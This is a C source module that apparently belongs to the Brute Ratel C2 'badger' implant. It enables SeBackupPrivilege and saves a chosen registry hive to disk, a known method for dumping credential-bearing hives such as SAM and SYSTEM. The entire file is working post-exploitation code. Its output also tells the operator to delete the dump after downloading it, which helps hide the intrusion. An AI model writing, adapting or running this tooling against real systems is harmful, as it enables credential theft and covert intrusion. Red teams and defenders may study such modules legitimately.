#include <windows.h>
#include "badger_exports.h"

DECLSPEC_IMPORT DWORD WINAPI Kernel32$GetLastError();
DECLSPEC_IMPORT DWORD WINAPI Kernel32$CloseHandle(HANDLE hObjec);

DECLSPEC_IMPORT BOOL WINAPI Advapi32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL WINAPI Advapi32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLui);
DECLSPEC_IMPORT BOOL WINAPI Advapi32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLengt);
DECLSPEC_IMPORT LSTATUS WINAPI Advapi32$RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
DECLSPEC_IMPORT LSTATUS WINAPI Advapi32$RegSaveKeyExA(HKEY hKey, LPCSTR lpFile, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD Flag);
DECLSPEC_IMPORT LSTATUS WINAPI Advapi32$RegCloseKey(HKEY hKey);

DWORD SetPrivilege(LPCSTR lpszPrivilege, BOOL bEnablePrivilege) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
	// Open a handle to the access token for the calling process. That is this running program
	if (! Advapi32$OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		BadgerDispatch(g_dispatch, "[-] Error OpenProcessToken: %lu\n", Kernel32$GetLastError()); 
		goto SetPrivilege_end;
	}
    if (! Advapi32$LookupPrivilegeValueA(NULL, lpszPrivilege, &luid)) {
        BadgerDispatch(g_dispatch, "[-] Error LookupPrivilegeValueA: %lu\n", Kernel32$GetLastError());
        goto SetPrivilege_end; 
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    } else {
        tp.Privileges[0].Attributes = 0;
    }
    if (! Advapi32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) {
        BadgerDispatch(g_dispatch, "[-] Error AdjustTokenPrivileges: %lu\n", Kernel32$GetLastError());
        goto SetPrivilege_end; 
    } 

SetPrivilege_end:
	if (hToken) {
		Kernel32$CloseHandle(hToken);
	}
    return Kernel32$GetLastError();
}

DWORD savereg(HKEY hive, const CHAR* regpath, const CHAR* outfile) {
	DWORD dwresult = 0;
	HKEY rootkey = NULL;
	dwresult = Advapi32$RegOpenKeyExA(hive, regpath, 0, KEY_READ, &rootkey);
	if (dwresult != ERROR_SUCCESS) {
		BadgerDispatch(g_dispatch, "[-] Error RegOpenKeyExA: %lu\n", dwresult); 
		goto savereg_end;
	}
	dwresult = Advapi32$RegSaveKeyExA(rootkey, outfile, NULL, REG_LATEST_FORMAT);
	if (dwresult != ERROR_SUCCESS) {
		BadgerDispatch(g_dispatch, "[-] Error RegSaveKeyExA: %lu\n", dwresult); 
		goto savereg_end;
	}
    savereg_end:
	if (rootkey) {
		Advapi32$RegCloseKey(rootkey);
	}
	return dwresult;
}

void coffee( char ** argv, int argc, WCHAR** dispatch) {
	DWORD dwErrorCode = ERROR_SUCCESS;
	CHAR* lpszOutputFilename = NULL;
	HKEY hkRootKey = NULL;
	LPCSTR lpszRegPathName = NULL;
	CHAR* hkey = NULL;
    g_dispatch = dispatch;

	if (argc != 3) {
        BadgerDispatch(dispatch, "[!] Usage: reg_save.o <Registry Hive> <Registry Path> <Filename>\n[!] NOTE:\n 1. Specify Registry hive as follows, HKEY_CLASSES_ROOT as HKCR, HKEY_CURRENT_USER as HKCU, HKEY_LOCAL_MACHINE as HKLM, HKEY_USERS as HKU and HKEY_CURRENT_CONFIG as HKCC\n 2. Use empty string \"\" for no path\n");
        return;
    }
	hkey = argv[0];
	BadgerDispatch(dispatch, "[*] HKEY : %s\n", hkey);

	if (BadgerStrcmp(hkey, "HKCR") == 0) {
		hkRootKey = HKEY_CLASSES_ROOT;
		hkey = "HKEY_CLASSES_ROOT";
	} else if (BadgerStrcmp(hkey, "HKCU") == 0) {
		hkRootKey = HKEY_CURRENT_USER;
		hkey = "HKEY_CURRENT_USER";
	} else if (BadgerStrcmp(hkey, "HKLM") == 0) {
		hkRootKey = HKEY_LOCAL_MACHINE;
		hkey = "HKEY_LOCAL_MACHINE";
	} else if (BadgerStrcmp(hkey, "HKU") == 0) {
		hkRootKey = HKEY_USERS;
		hkey = "HKEY_USERS";
	} else if (BadgerStrcmp(hkey, "HKCC") == 0) {
		hkRootKey = HKEY_CURRENT_CONFIG;
		hkey = "HKEY_CURRENT_CONFIG";
	} else {
		BadgerDispatch(dispatch, " [-] Invalid option, Specify either of the following options.\n HKEY_CLASSES_ROOT as HKCR, HKEY_CURRENT_USER as HKCU, HKEY_LOCAL_MACHINE as HKLM, HKEY_USERS as HKU and HKEY_CURRENT_CONFIG as HKCC\n");
		return;
	}
	lpszOutputFilename = argv[2];
	if (BadgerStrlen(lpszOutputFilename) > MAX_PATH) {
		BadgerDispatch(dispatch, "[-] Filename is greater than %d max size\n", MAX_PATH);
		return;
	}
	BadgerDispatch(dispatch, "[*] Output file: %s\n", lpszOutputFilename);
	lpszRegPathName = argv[1];
    if(lpszRegPathName == "" || lpszRegPathName == NULL) {
        lpszRegPathName = NULL;
    }
    BadgerDispatch(dispatch, "[*] Registry path: %s\n", lpszRegPathName);
	dwErrorCode = SetPrivilege(SE_BACKUP_NAME, TRUE);
	if (ERROR_SUCCESS != dwErrorCode) {
		BadgerDispatch(dispatch, "[-] Error SetPrivilege: %lu\n", Kernel32$GetLastError());
		goto main_end;
	}
	BadgerDispatch(dispatch, "[*] Saving registry key '%s\\%s' to file '%s'\n", hkey, lpszRegPathName, lpszOutputFilename);
	dwErrorCode = savereg(hkRootKey, lpszRegPathName, lpszOutputFilename);
	if (ERROR_SUCCESS == dwErrorCode) {
		BadgerDispatch(dispatch, "[+] Success\n[*] Don't Forget to delete the file after you download it!\n");
	}

main_end:
    if(hkRootKey){
        Advapi32$RegCloseKey(hkRootKey);
    }
	return;
}
